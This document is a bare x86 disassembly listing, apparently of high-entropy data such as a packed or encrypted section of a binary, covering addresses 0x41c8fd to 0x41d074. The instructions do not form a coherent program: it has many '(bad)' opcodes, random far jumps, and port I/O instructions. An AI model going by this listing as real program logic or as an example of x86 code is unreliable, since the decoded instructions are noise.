  41c8fd:	cs mov dl,0xa0
  41c900:	jno    0x41c918
  41c902:	push   edi
  41c903:	xchg   ecx,eax
  41c904:	push   esp
  41c905:	xor    edi,DWORD PTR [eax+0x67]
  41c908:	ins    DWORD PTR es:[edi],dx
  41c909:	aad    0x6c
  41c90b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c90c:	popa   
  41c90d:	loopne 0x41c917
  41c90f:	out    dx,al
  41c910:	adc    edi,DWORD PTR [ebx+0x5476fb8a]
  41c916:	fwait
  41c917:	daa    
  41c918:	xor    al,0xe4
  41c91a:	fcmovb st,st(5)
  41c91c:	xor    esp,DWORD PTR [esi+0x6]
  41c91f:	ins    BYTE PTR es:[edi],dx
  41c920:	mov    bl,0x0
  41c922:	jmp    0xed527b8a
  41c927:	pop    ebp
  41c928:	lods   eax,DWORD PTR ds:[esi]
  41c929:	mov    cl,0xe9
  41c92b:	out    0xaa,al
  41c92d:	jnp    0x41c946
  41c92f:	ret    
  41c930:	jecxz  0x41c8f6
  41c932:	jg     0x41c93c
  41c934:	shl    bh,cl
  41c936:	and    al,al
  41c938:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c939:	mov    esp,0x654da2c5
  41c93e:	lea    ecx,[ebx]
  41c940:	arpl   WORD PTR [esi+eiz*2],bp
  41c943:	retf   0x71e3
  41c946:	loope  0x41c965
  41c948:	shl    DWORD PTR cs:[edx],0xae
  41c94c:	adc    bl,BYTE PTR [ebx-0x53807248]
  41c952:	das    
  41c953:	out    0xad,al
  41c955:	add    al,BYTE PTR [esi+0x72]
  41c958:	lea    edi,[edi-0x63]
  41c95b:	mov    esi,0x77ca3a7f
  41c960:	loopne 0x41c934
  41c962:	jmp    0xea2a9839
  41c967:	es cld 
  41c969:	xor    eax,0x526631a1
  41c96e:	outs   dx,DWORD PTR ds:[esi]
  41c96f:	ds test al,0xd1
  41c972:	pop    ebx
  41c973:	and    eax,0xaad981c0
  41c978:	xchg   ecx,eax
  41c979:	mov    ebx,gs
  41c97b:	aas    
  41c97c:	jmp    0xd907:0x1804be02
  41c983:	inc    edi
  41c984:	adc    BYTE PTR [eax+0x6a673e5d],0xaf
  41c98b:	inc    esp
  41c98c:	mov    ds:0x40c433e1,al
  41c991:	xchg   edi,eax
  41c992:	cmc    
  41c993:	jge    0x41c9a9
  41c995:	jge    0x41c966
  41c997:	loope  0x41ca0f
  41c999:	shr    DWORD PTR [ecx],0x7d
  41c99c:	push   ss
  41c99d:	sbb    BYTE PTR [esi],al
  41c99f:	out    0x56,al
  41c9a1:	data16 cld 
  41c9a3:	or     eax,0x7e6d53b3
  41c9a8:	mov    edi,0x90a7757d
  41c9ad:	xchg   ecx,eax
  41c9ae:	les    esi,FWORD PTR [edx-0x1f554e96]
  41c9b4:	xlat   BYTE PTR ds:[ebx]
  41c9b5:	loop   0x41ca16
  41c9b7:	jmp    0x23e368ca
  41c9bc:	les    esi,FWORD PTR ds:0x24039109
  41c9c2:	out    dx,al
  41c9c3:	and    DWORD PTR [edi+0x3b37e5f9],esi
  41c9c9:	in     eax,dx
  41c9ca:	fnstenv [esi+0x4a65a138]
  41c9d0:	mov    edx,0xc222d9b7
  41c9d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9d6:	mov    cl,0x20
  41c9d8:	adc    al,0x9a
  41c9da:	popf   
  41c9db:	mov    eax,ds:0x60a8203f
  41c9e0:	pop    esp
  41c9e1:	or     bl,bh
  41c9e3:	popa   
  41c9e4:	ret    
  41c9e5:	dec    bl
  41c9e7:	xor    DWORD PTR [ecx+0x6aea24c0],0xb77e3c1b
  41c9f1:	mov    ds:0x5232a947,eax
  41c9f6:	and    eax,0x5c88f74e
  41c9fb:	or     eax,0x293dbb0b
  41ca00:	out    0x2b,eax
  41ca02:	pop    ss
  41ca03:	int3   
  41ca04:	xchg   esp,eax
  41ca05:	fwait
  41ca06:	push   es
  41ca07:	out    dx,al
  41ca08:	rcr    BYTE PTR [ebp-0x1a],1
  41ca0b:	mov    esi,0xcfd229ac
  41ca10:	pusha  
  41ca11:	into   
  41ca12:	int3   
  41ca13:	fwait
  41ca14:	add    eax,0xd6924db7
  41ca19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca1a:	push   ds
  41ca1b:	cld    
  41ca1c:	je     0x41ca33
  41ca1e:	sahf   
  41ca1f:	cmp    eax,0x7e69f7e3
  41ca24:	test   DWORD PTR [esi-0x2caae727],esi
  41ca2a:	adc    eax,0xc14cba54
  41ca2f:	mov    ?,esp
  41ca31:	in     al,0x27
  41ca33:	push   eax
  41ca34:	out    0x82,al
  41ca36:	jecxz  0x41ca73
  41ca38:	xchg   ecx,eax
  41ca39:	cmp    al,0xce
  41ca3b:	outs   dx,BYTE PTR ds:[esi]
  41ca3c:	or     ebp,esp
  41ca3e:	mov    ecx,0x1b73933
  41ca43:	scas   eax,DWORD PTR es:[edi]
  41ca44:	push   edx
  41ca45:	nop
  41ca46:	sbb    edi,DWORD PTR [ebx+ebx*8-0x76ddf51a]
  41ca4d:	shl    BYTE PTR [edi+edx*2],1
  41ca50:	cmp    edi,DWORD PTR [ebp+ebp*4+0x18]
  41ca54:	mov    al,0x85
  41ca56:	imul   eax,ecx,0xaf0ed4b5
  41ca5c:	mov    edx,0xc19c43b8
  41ca61:	xor    esi,DWORD PTR [esi+esi*2]
  41ca64:	jl     0x41cac2
  41ca66:	xor    al,dl
  41ca68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca69:	xchg   esi,eax
  41ca6a:	or     ecx,DWORD PTR [ebx+0x6f156f0]
  41ca70:	add    esp,DWORD PTR [esi+0x79]
  41ca73:	ficomp DWORD PTR [ebx+0x53]
  41ca76:	push   0x35
  41ca78:	sbb    eax,0x4f0d541e
  41ca7d:	pop    edi
  41ca7e:	test   BYTE PTR [esi],ah
  41ca80:	test   BYTE PTR [eax],al
  41ca82:	test   dl,bl
  41ca84:	ret    0x669f
  41ca87:	pop    es
  41ca88:	lods   eax,DWORD PTR ds:[esi]
  41ca89:	and    al,0xf0
  41ca8b:	cs cmc 
  41ca8d:	push   edx
  41ca8e:	pushf  
  41ca8f:	add    ebx,ecx
  41ca91:	popa   
  41ca92:	rcl    BYTE PTR [edx+ebx*4+0x669e7cc1],cl
  41ca99:	mov    cs,WORD PTR [ebx+0x256e0792]
  41ca9f:	add    esi,DWORD PTR [ebp+0x11dea141]
  41caa5:	ret    
  41caa6:	cld    
  41caa7:	jo     0x41caed
  41caa9:	es add al,0x3b
  41caac:	mov    dh,0x59
  41caae:	and    BYTE PTR [ebp-0x10216714],ah
  41cab4:	or     ebx,DWORD PTR [edi+ebx*1+0x7bff782d]
  41cabb:	push   cs
  41cabc:	dec    edi
  41cabd:	sahf   
  41cabe:	in     eax,dx
  41cabf:	leave  
  41cac0:	xor    eax,0xdc3ec6e2
  41cac5:	add    cl,BYTE PTR [edi-0x3a]
  41cac8:	(bad)  
  41cac9:	dec    eax
  41caca:	xlat   BYTE PTR ds:[ebx]
  41cacb:	push   esp
  41cacc:	inc    esp
  41cacd:	aas    
  41cace:	jle    0x41cab9
  41cad0:	jnp    0x41cad8
  41cad2:	mov    ch,0xb9
  41cad4:	pop    ss
  41cad5:	je     0x41caa7
  41cad7:	push   0xb992577c
  41cadc:	mov    bl,0xa9
  41cade:	inc    edx
  41cadf:	iret   
  41cae0:	int3   
  41cae1:	or     eax,0x81424250
  41cae6:	lock (bad) 
  41cae8:	les    ebp,FWORD PTR [edi-0x25]
  41caeb:	fisttp QWORD PTR [edi+0x20d5fe67]
  41caf1:	shr    al,1
  41caf3:	and    ah,BYTE PTR ds:[ebx]
  41caf6:	mul    eax
  41caf8:	push   edi
  41caf9:	or     BYTE PTR [esi+0xd45a352],dl
  41caff:	pop    ebp
  41cb00:	mov    edx,edi
  41cb02:	push   ss
  41cb03:	dec    esi
  41cb04:	loope  0x41cb10
  41cb06:	inc    esi
  41cb07:	call   0xf7b46fa3
  41cb0c:	pop    esp
  41cb0d:	ja     0x41cb2c
  41cb0f:	push   esi
  41cb10:	sbb    al,0x2c
  41cb12:	cmp    bh,BYTE PTR [esp+edi*8]
  41cb15:	sbb    ch,BYTE PTR [edi-0xad04368]
  41cb1b:	adc    ebp,DWORD PTR [esi+0x1946358e]
  41cb21:	icebp  
  41cb22:	pop    edi
  41cb23:	out    dx,al
  41cb24:	stc    
  41cb25:	stos   BYTE PTR es:[edi],al
  41cb26:	adc    bx,WORD PTR [ebp-0x5f]
  41cb2a:	stc    
  41cb2b:	sar    BYTE PTR [ecx+0x7c193c0c],cl
  41cb31:	sbb    eax,0x90cb8f58
  41cb36:	pop    edi
  41cb37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb38:	xor    al,0x23
  41cb3a:	mov    ch,0x88
  41cb3c:	jle    0x41cb8d
  41cb3e:	jnp    0x41cb68
  41cb40:	mov    esp,0x63a9ee8f
  41cb45:	adc    al,0x5c
  41cb47:	cmp    eax,DWORD PTR [ebx-0x45b9260a]
  41cb4d:	xor    esp,DWORD PTR [eax+edx*4]
  41cb50:	xor    edx,DWORD PTR cs:[ecx+0x48ed0521]
  41cb57:	add    al,0xd6
  41cb59:	pop    eax
  41cb5a:	cwde   
  41cb5b:	jbe    0x41cbd9
  41cb5d:	add    al,0xdd
  41cb5f:	leave  
  41cb60:	(bad)  
  41cb61:	fst    st(0)
  41cb63:	popf   
  41cb64:	ja     0x41cb5b
  41cb66:	icebp  
  41cb67:	mov    ds:0x507c83c9,al
  41cb6c:	mov    esi,ecx
  41cb6e:	sub    dh,ch
  41cb70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb71:	pop    edx
  41cb72:	imul   edx,DWORD PTR [edi+0x49],0x35
  41cb76:	dec    eax
  41cb77:	sbb    BYTE PTR ss:[ecx],bl
  41cb7a:	jl     0x41cb9f
  41cb7c:	cmp    al,0xa0
  41cb7e:	loop   0x41cbf3
  41cb80:	fs sar cl,1
  41cb83:	inc    edi
  41cb84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb85:	mov    esi,0xda24b3ab
  41cb8a:	xor    al,0xa4
  41cb8c:	cmp    bh,BYTE PTR [ecx+0x488c0714]
  41cb92:	sub    bh,BYTE PTR [ecx+0x36ebe47b]
  41cb98:	cmp    ebp,DWORD PTR [edi-0x294a9c2]
  41cb9e:	sub    al,0xae
  41cba0:	ja     0x41cbb2
  41cba2:	out    dx,eax
  41cba3:	mov    ds:0x5017ffb0,al
  41cba8:	sbb    edi,edi
  41cbaa:	sbb    eax,0xa763fda8
  41cbaf:	dec    ebp
  41cbb0:	psadbw mm5,mm4
  41cbb3:	jns    0x41cbd7
  41cbb5:	pusha  
  41cbb6:	inc    ebp
  41cbb7:	add    ebp,ecx
  41cbb9:	fist   DWORD PTR [ebx+ecx*4+0x3]
  41cbbd:	or     DWORD PTR [ebp+0x1d],edi
  41cbc0:	and    DWORD PTR [edx],esp
  41cbc2:	aaa    
  41cbc3:	stos   DWORD PTR es:[edi],eax
  41cbc4:	ret    0x2ea7
  41cbc7:	iret   
  41cbc8:	jecxz  0x41cbf7
  41cbca:	into   
  41cbcb:	sbb    al,0x5f
  41cbcd:	clc    
  41cbce:	int3   
  41cbcf:	inc    esi
  41cbd0:	mov    ds:0x123a14ce,eax
  41cbd5:	or     eax,0x7c6fc2aa
  41cbda:	ret    0x5955
  41cbdd:	sti    
  41cbde:	mul    BYTE PTR [ecx-0x6b]
  41cbe1:	ss sbb eax,0x88f518fb
  41cbe7:	adc    DWORD PTR [edx],0x74
  41cbea:	xor    BYTE PTR [ebp+0x13f25175],bh
  41cbf0:	inc    eax
  41cbf1:	sar    DWORD PTR [ecx+0x28aae7c3],cl
  41cbf7:	arpl   WORD PTR [edx-0x6a0a53bb],di
  41cbfd:	jmp    0x183f:0xb519ac2
  41cc04:	(bad)  
  41cc05:	or     BYTE PTR [edx+0x6887bf4],al
  41cc0b:	cmp    al,0x4
  41cc0d:	mov    al,0xbf
  41cc0f:	mov    ds:0x3e4e1305,eax
  41cc14:	sub    eax,0xddab0380
  41cc19:	hlt    
  41cc1a:	rcr    BYTE PTR [esi+0x5102129c],cl
  41cc20:	sub    eax,0x762dadde
  41cc25:	push   cs
  41cc26:	cmp    ebp,ecx
  41cc28:	fsub   QWORD PTR [edi-0x68]
  41cc2b:	pop    es
  41cc2c:	mov    ds:0x447ed186,al
  41cc31:	icebp  
  41cc32:	in     eax,0x55
  41cc34:	cmp    esp,DWORD PTR [edx+0x23]
  41cc37:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41cc39:	jecxz  0x41cbdf
  41cc3b:	cwde   
  41cc3c:	retf   0x3f21
  41cc3f:	jmp    0xf72a:0x3fffd880
  41cc46:	sbb    bh,dl
  41cc48:	imul   ebp,DWORD PTR [edx],0xfb29945e
  41cc4e:	or     bh,0xe8
  41cc51:	les    esp,FWORD PTR [ebp+0x32c2e671]
  41cc57:	sub    DWORD PTR [ebp+0x2f],0xfef91fc8
  41cc5e:	and    dh,BYTE PTR [ebx+0xbc0a8b0]
  41cc64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc65:	aad    0x16
  41cc67:	and    edx,DWORD PTR [ebx+0x2b]
  41cc6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc6b:	mov    eax,ds:0x223d2895
  41cc70:	jnp    0x41ccf0
  41cc72:	jg     0x41cc9a
  41cc74:	(bad)  
  41cc75:	out    0x80,al
  41cc77:	cdq    
  41cc78:	bound  ebp,QWORD PTR [eax+0x5a]
  41cc7b:	pop    ebx
  41cc7c:	xchg   ebp,eax
  41cc7d:	and    BYTE PTR [eax+ecx*8+0x458a838c],0x7f
  41cc85:	sub    esi,ebp
  41cc87:	ins    DWORD PTR es:[edi],dx
  41cc88:	cs mov ecx,0x17bd81e9
  41cc8e:	cmp    ebp,DWORD PTR [ebx+eax*2-0x4c]
  41cc92:	add    ebx,DWORD PTR [edx+0x28]
  41cc95:	inc    edx
  41cc96:	sbb    edx,DWORD PTR ds:0xfa427f69
  41cc9c:	dec    edx
  41cc9d:	adc    eax,0x470ec889
  41cca2:	clc    
  41cca3:	jmp    0x41ccc1
  41cca5:	xor    edx,DWORD PTR ds:[ebx]
  41cca8:	cli    
  41cca9:	in     al,0xfe
  41ccab:	(bad)  
  41ccad:	sbb    al,BYTE PTR [edi+0x1a]
  41ccb0:	jb     0x41cd0d
  41ccb2:	mov    WORD PTR [edx+0x2c],ds
  41ccb5:	ins    BYTE PTR es:[edi],dx
  41ccb6:	add    eax,esp
  41ccb8:	pop    eax
  41ccb9:	adc    BYTE PTR [esp+eiz*4],bl
  41ccbc:	test   eax,0x5603bbdd
  41ccc1:	xchg   ecx,eax
  41ccc2:	sub    eax,0x870cc98b
  41ccc7:	xor    eax,0x6f95d7e4
  41cccc:	aad    0x1
  41ccce:	jne    0x41cc90
  41ccd0:	adc    eax,DWORD PTR [ebx+0x9dbea8b]
  41ccd6:	push   ebp
  41ccd7:	adc    eax,0x4f07231e
  41ccdc:	into   
  41ccdd:	cld    
  41ccde:	hlt    
  41ccdf:	ret    
  41cce0:	aaa    
  41cce1:	cld    
  41cce2:	fwait
  41cce3:	je     0x41cd1a
  41cce5:	jmp    0x41ccbe
  41cce7:	push   ebp
  41cce8:	mov    eax,0x5d6c88bd
  41cced:	enter  0x1d44,0x98
  41ccf1:	jecxz  0x41cc9d
  41ccf3:	int3   
  41ccf4:	xchg   esp,eax
  41ccf5:	fdivrp st(1),st
  41ccf7:	test   eax,0x8d005499
  41ccfc:	fadd   st,st(4)
  41ccfe:	and    dh,0xd9
  41cd01:	mov    bh,0x31
  41cd03:	pop    ss
  41cd04:	out    0x46,al
  41cd06:	loope  0x41cd5a
  41cd08:	dec    ecx
  41cd09:	and    al,0xe3
  41cd0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd0c:	mov    dh,0xe7
  41cd0e:	adc    al,0x60
  41cd10:	pop    ebp
  41cd11:	and    DWORD PTR [edx],ecx
  41cd13:	out    dx,al
  41cd14:	imul   ebp,DWORD PTR ss:[edi-0x7],0x1059b511
  41cd1c:	xlat   BYTE PTR ds:[ebx]
  41cd1d:	into   
  41cd1e:	lock sbb BYTE PTR [ebp+edx*1-0x35],al
  41cd23:	pop    ecx
  41cd24:	popf   
  41cd25:	lods   eax,DWORD PTR ds:[esi]
  41cd26:	pop    edx
  41cd27:	xlat   BYTE PTR ds:[ebx]
  41cd28:	movaps xmm5,XMMWORD PTR [edi+0x49]
  41cd2c:	arpl   WORD PTR [esi-0x59],si
  41cd2f:	pop    edi
  41cd30:	mov    ah,0xaf
  41cd32:	mul    BYTE PTR [esi+0x1b]
  41cd35:	in     al,dx
  41cd36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd37:	das    
  41cd38:	popa   
  41cd39:	inc    ebx
  41cd3a:	outs   dx,DWORD PTR ds:[esi]
  41cd3b:	(bad)  
  41cd3c:	fld    DWORD PTR [ebp-0x71bac36f]
  41cd42:	(bad)  
  41cd43:	cwde   
  41cd44:	idiv   BYTE PTR [esi+0x5b]
  41cd47:	nop
  41cd48:	cmp    eax,0xc90c554e
  41cd4d:	stos   BYTE PTR es:[edi],al
  41cd4e:	sbb    dh,bl
  41cd50:	int3   
  41cd51:	xchg   edi,eax
  41cd52:	arpl   WORD PTR [edx-0x5f],sp
  41cd55:	push   ss
  41cd56:	jmp    0xac21aaba
  41cd5b:	mov    ds:0x531c1576,al
  41cd60:	xor    ebx,DWORD PTR [edx+0x15d35451]
  41cd66:	mov    BYTE PTR [ecx*4-0x5a8cd835],al
  41cd6d:	sub    DWORD PTR [esi+0x42518681],ebx
  41cd73:	les    ebp,FWORD PTR [ebx+0x22457485]
  41cd79:	clc    
  41cd7a:	imul   DWORD PTR [edi+0x51]
  41cd7d:	sbb    DWORD PTR [esp+edx*4],edx
  41cd80:	jne    0x41cdb3
  41cd82:	out    dx,al
  41cd83:	push   esi
  41cd84:	mov    ecx,0x4b0544b8
  41cd89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd8a:	cmp    eax,0x51d6d5e3
  41cd8f:	bound  esi,QWORD PTR [edi]
  41cd91:	push   esi
  41cd92:	jmp    0xe686b0fc
  41cd97:	jmp    0x41cd60
  41cd99:	cmp    ch,BYTE PTR [ecx+edx*4+0x7b]
  41cd9d:	mov    esp,0xbac9ec03
  41cda2:	mov    al,ds:0x3f9f1b3b
  41cda8:	pop    es
  41cda9:	adc    edx,ebx
  41cdab:	or     esp,ecx
  41cdad:	test   BYTE PTR [edx+0x60],al
  41cdb0:	sbb    BYTE PTR [edx],bl
  41cdb2:	jnp    0x41cd77
  41cdb4:	add    dh,ah
  41cdb6:	in     al,dx
  41cdb7:	ror    bl,cl
  41cdb9:	icebp  
  41cdba:	pushf  
  41cdbb:	mov    dl,0x9b
  41cdbd:	push   ebp
  41cdbe:	xor    al,0x83
  41cdc0:	sbb    DWORD PTR cs:[ebp-0x73],0xffffffa5
  41cdc5:	push   ds
  41cdc6:	inc    ebx
  41cdc7:	push   es
  41cdc8:	inc    ecx
  41cdc9:	call   0xdf792320
  41cdce:	mov    dl,0xbf
  41cdd0:	into   
  41cdd1:	test   esi,ebx
  41cdd3:	xchg   ebx,eax
  41cdd4:	and    BYTE PTR [edi-0x1afc1ed0],al
  41cdda:	fstp   QWORD PTR [edx+eiz*4]
  41cddd:	sahf   
  41cdde:	fimul  WORD PTR [ecx-0x18f7929a]
  41cde4:	mov    al,0x35
  41cde6:	int3   
  41cde7:	and    eax,0xc35250c5
  41cdec:	push   ebp
  41cded:	test   BYTE PTR [eax+0x130e6abe],ah
  41cdf3:	push   ebx
  41cdf4:	and    DWORD PTR [eax],edx
  41cdf6:	mov    WORD PTR [ebp+edi*2+0x6],ds
  41cdfa:	data16 fwait
  41cdfc:	or     BYTE PTR [ebp-0x8],0x70
  41ce00:	sub    dh,dh
  41ce02:	loope  0x41ce0a
  41ce04:	lods   eax,DWORD PTR ds:[esi]
  41ce05:	mov    ch,0x29
  41ce07:	pop    ebp
  41ce08:	add    eax,0xc3028173
  41ce0d:	jle    0x41ce06
  41ce0f:	lea    ebx,[eax-0x6f]
  41ce12:	les    esi,FWORD PTR [eax+0x587f1b49]
  41ce18:	mov    ebx,0xcec12b70
  41ce1d:	jmp    0x41ce3b
  41ce1f:	add    eax,0x7e9423dd
  41ce24:	dec    ax
  41ce26:	add    ebx,ecx
  41ce28:	repnz lods al,BYTE PTR ds:[esi]
  41ce2a:	call   0x868d8267
  41ce2f:	inc    ecx
  41ce30:	fwait
  41ce31:	gs mov bh,0x44
  41ce34:	mov    eax,ds:0xe46856ea
  41ce39:	jecxz  0x41cdf1
  41ce3b:	aad    0x2e
  41ce3d:	daa    
  41ce3e:	mov    ds:0xd417c3e1,al
  41ce43:	in     eax,0x96
  41ce45:	mov    DWORD PTR [eax+0x4d3cdf21],eax
  41ce4b:	pop    ebx
  41ce4c:	xchg   edi,eax
  41ce4d:	sub    esi,DWORD PTR [ebx-0x4d6f9bbd]
  41ce53:	xor    esp,esi
  41ce55:	jp     0x41ce4b
  41ce57:	sbb    al,0x69
  41ce59:	and    al,0xfd
  41ce5b:	outs   dx,BYTE PTR ds:[esi]
  41ce5c:	fldenv [ebp+0x5a]
  41ce5f:	scas   eax,DWORD PTR es:[edi]
  41ce60:	or     eax,0x59db0458
  41ce65:	jl     0x41ce86
  41ce67:	jns    0x41ce11
  41ce69:	sbb    ah,bl
  41ce6b:	or     edx,DWORD PTR [ebp+0x18b8c46d]
  41ce71:	pop    ecx
  41ce72:	idiv   BYTE PTR [eax+0x3d]
  41ce75:	repnz push edx
  41ce77:	xor    al,0xb1
  41ce79:	pop    es
  41ce7a:	mov    bh,0x2
  41ce7c:	xchg   esi,eax
  41ce7d:	xchg   ebx,eax
  41ce7e:	data16 lahf 
  41ce80:	jns    0x41ceb3
  41ce82:	sub    eax,0xbbd56864
  41ce87:	mov    edi,0x98788e6c
  41ce8c:	xlat   BYTE PTR ds:[ebx]
  41ce8d:	daa    
  41ce8e:	aas    
  41ce8f:	rol    BYTE PTR [ebp-0x24],0x26
  41ce93:	adc    esp,DWORD PTR [ecx+0x5b]
  41ce96:	ins    DWORD PTR es:[edi],dx
  41ce97:	mov    ebx,0xe6a14885
  41ce9c:	dec    esi
  41ce9d:	mov    ah,0x5a
  41ce9f:	bound  esp,QWORD PTR [ebx+0x3c2f9e1e]
  41cea5:	or     eax,0xc0a4637a
  41ceab:	(bad)  
  41ceac:	in     eax,dx
  41cead:	imul   esp,edi,0x196fc3ca
  41ceb3:	scas   al,BYTE PTR es:[edi]
  41ceb4:	push   esi
  41ceb5:	pop    edi
  41ceb6:	push   0xe9f9831c
  41cebb:	cli    
  41cebc:	(bad)  
  41cebd:	xchg   edx,eax
  41cebe:	in     al,0x3b
  41cec0:	inc    esi
  41cec1:	je     0x41cf37
  41cec3:	or     DWORD PTR [ecx+ebx*2],esi
  41cec6:	sub    bh,BYTE PTR ds:0x92e2c228
  41cecc:	sbb    eax,0x79794564
  41ced1:	nop
  41ced2:	ret    0x75e5
  41ced5:	mov    WORD PTR [edi],?
  41ced7:	retf   0xa81d
  41ceda:	mov    dh,0x5b
  41cedc:	sbb    eax,0xbd2d0900
  41cee1:	jl     0x41cec8
  41cee3:	(bad)  [ecx+0x37aee1c5]
  41cee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceea:	dec    esi
  41ceeb:	sbb    BYTE PTR [ebx+0x2207e120],ah
  41cef1:	mov    al,ds:0xff3c6f44
  41cef6:	or     DWORD PTR [esi+edx*1+0x4ae1edc7],edx
  41cefd:	xchg   esp,eax
  41cefe:	lods   eax,DWORD PTR ds:[esi]
  41ceff:	out    dx,eax
  41cf00:	fiadd  DWORD PTR [eax+ebx*8-0x6b]
  41cf04:	arpl   WORD PTR [ebx-0x22],ax
  41cf07:	and    BYTE PTR [edx+eax*2],dh
  41cf0a:	out    0xed,eax
  41cf0c:	push   ebp
  41cf0d:	mov    edi,ecx
  41cf0f:	inc    edx
  41cf10:	mov    BYTE PTR [eax+0x69],ah
  41cf13:	push   0x56
  41cf15:	jo     0x41cf39
  41cf17:	push   ebx
  41cf18:	or     esi,DWORD PTR [ecx+0xc2582f4]
  41cf1e:	into   
  41cf1f:	aaa    
  41cf20:	pop    edx
  41cf21:	ins    DWORD PTR es:[edi],dx
  41cf22:	push   eax
  41cf23:	and    DWORD PTR [ecx-0x4def4293],0x157edc67
  41cf2d:	in     eax,dx
  41cf2e:	add    dl,BYTE PTR [ecx]
  41cf30:	add    al,0x92
  41cf32:	mov    ?,WORD PTR [eax]
  41cf34:	xor    dl,BYTE PTR [ebx+0x4c]
  41cf37:	scas   al,BYTE PTR es:[edi]
  41cf38:	(bad)
  41cf3c:	fwait
  41cf3d:	lds    edx,FWORD PTR [ebx-0xe]
  41cf40:	pusha  
  41cf41:	add    bh,BYTE PTR [edx-0x40]
  41cf44:	arpl   WORD PTR [eax+eax*2+0x31],di
  41cf48:	cdq    
  41cf49:	pop    ebx
  41cf4a:	mov    bl,0x6e
  41cf4c:	jno    0x41cf1b
  41cf4e:	sbb    ebp,ebp
  41cf50:	ja     0x41cfc6
  41cf52:	jno    0x41cf84
  41cf54:	mov    ebp,0x14899573
  41cf59:	int    0xac
  41cf5b:	jmp    0x4767a5f5
  41cf60:	adc    al,0x54
  41cf62:	pop    eax
  41cf63:	jecxz  0x41ceee
  41cf65:	dec    ebp
  41cf66:	rcl    BYTE PTR [edi],1
  41cf68:	xor    al,0x54
  41cf6a:	and    esi,ebx
  41cf6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf6d:	mov    al,0x2
  41cf6f:	xchg   ebx,eax
  41cf70:	jl     0x41cf4d
  41cf72:	push   ds
  41cf73:	je     0x41cf27
  41cf75:	jnp    0x41cf11
  41cf77:	mov    eax,0xdb217701
  41cf7c:	fsub   QWORD PTR [edi-0x6957d62d]
  41cf82:	mov    cl,0x10
  41cf84:	mov    eax,0xda104ebc
  41cf89:	cmp    al,0xd8
  41cf8b:	push   esi
  41cf8c:	js     0x41cf6b
  41cf8e:	fsub   QWORD PTR [edi+ecx*8-0x20563719]
  41cf95:	call   0x25c5:0xa8c586ed
  41cf9c:	and    eax,0x6a09e6be
  41cfa1:	add    esi,ebp
  41cfa3:	and    DWORD PTR [eax+eiz*4],esp
  41cfa6:	in     eax,dx
  41cfa7:	dec    esp
  41cfa8:	ja     0x41cf69
  41cfaa:	sbb    BYTE PTR [ebx+ebp*1+0x26],dh
  41cfae:	mov    gs,WORD PTR [edi-0x9705623]
  41cfb4:	call   0xfeaa62e6
  41cfb9:	ret    
  41cfba:	(bad)  
  41cfbb:	xchg   ecx,eax
  41cfbc:	int    0x4a
  41cfbe:	les    eax,FWORD PTR [ebx-0x77]
  41cfc1:	sti    
  41cfc2:	(bad)  
  41cfc3:	jl     0x41cfca
  41cfc5:	aam    0x71
  41cfc7:	mov    BYTE PTR [eax-0x34d7157c],al
  41cfcd:	ret    0x671e
  41cfd0:	shr    BYTE PTR [esi-0xfe186c5],0xec
  41cfd7:	xchg   esi,eax
  41cfd8:	iret   
  41cfd9:	add    DWORD PTR [edi+edi*2+0x32],esi
  41cfdd:	cmp    edi,DWORD PTR [esi-0x35]
  41cfe0:	add    ch,ah
  41cfe2:	aaa    
  41cfe3:	inc    ebp
  41cfe4:	adc    edi,ebp
  41cfe6:	ss in  al,dx
  41cfe8:	adc    al,0xbb
  41cfea:	fidiv  DWORD PTR [ebp-0x52d914e7]
  41cff0:	ret    
  41cff1:	scas   al,BYTE PTR es:[edi]
  41cff2:	or     ah,0x48
  41cff5:	cmp    ebx,ebx
  41cff7:	xor    DWORD PTR [ebx-0x2276c587],ecx
  41cffd:	and    al,0xed
  41cfff:	mov    WORD PTR [ecx],ss
  41d001:	mov    ch,0x23
  41d003:	inc    ebp
  41d004:	sbb    al,0x23
  41d006:	or     al,0x24
  41d008:	jmp    0xd8b75c01
  41d00d:	fdiv   DWORD PTR [edi-0x2a]
  41d010:	add    al,bl
  41d012:	adc    al,0x64
  41d014:	mov    ds,WORD PTR [esp+eiz*8]
  41d017:	push   ss
  41d018:	dec    edi
  41d019:	aam    0xb3
  41d01b:	imul   esp,DWORD PTR [eax],0x60
  41d01e:	in     eax,0x25
  41d020:	mov    esi,DWORD PTR [edx+edx*8]
  41d023:	mov    bl,0xa3
  41d025:	ficom  WORD PTR [eax+0x8a341d0]
  41d02b:	dec    edx
  41d02c:	or     BYTE PTR [eax+0x6f2fdd1d],bh
  41d032:	mov    dl,0x52
  41d034:	js     0x41d006
  41d036:	or     DWORD PTR [ecx-0x29943062],ecx
  41d03c:	xor    DWORD PTR [eax-0x37],eax
  41d03f:	jle    0x41d038
  41d041:	jne    0x41d03f
  41d043:	in     al,dx
  41d044:	ds mov ch,0xfe
  41d047:	adc    BYTE PTR [esi-0x3e],ch
  41d04a:	adc    ebx,esp
  41d04c:	push   ebx
  41d04d:	(bad)  
  41d04e:	nop
  41d04f:	test   BYTE PTR [ebp-0x8153f5e],dl
  41d055:	xor    BYTE PTR [edx+0x52],bl
  41d058:	jmp    0x84b7:0x1a4a78ed
  41d05f:	aam    0x19
  41d061:	dec    edx
  41d062:	pushf  
  41d063:	cwde   
  41d064:	imul   ecx,DWORD PTR [ecx],0x8fee7fde
  41d06a:	pop    edi
  41d06b:	in     eax,0x7f
  41d06d:	test   eax,0x36ae17bc
  41d072:	add    ebx,DWORD PTR [edx]
  41d074:	enter  0xf33b,0xf2
